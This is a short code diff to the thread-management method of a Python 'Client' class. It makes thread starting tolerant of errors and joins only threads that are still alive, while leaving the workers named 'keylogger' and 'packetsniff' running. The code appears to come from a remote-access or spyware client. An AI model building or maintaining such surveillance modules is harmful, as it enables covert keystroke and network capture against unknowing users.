@@ -536,12 +536,14 @@ class Client(object):
              if module.status and sys.platform in module.platforms:
                 self._threads[name] = Thread(target=module, name=name)
                 self._threads[name].daemon = True
-        for worker, task in self._threads.items():
-            if not task.is_alive():
+        for task in self._threads.values():
+            try:
                 task.start()
+            except: pass
         for worker, task in self._threads.items():
             if worker not in ('keylogger','packetsniff'):
-                task.join()
+                if task.is_alive():
+                    task.join()
                 _ = self._threads.pop(worker, None)
         return self._show(self._result)
 
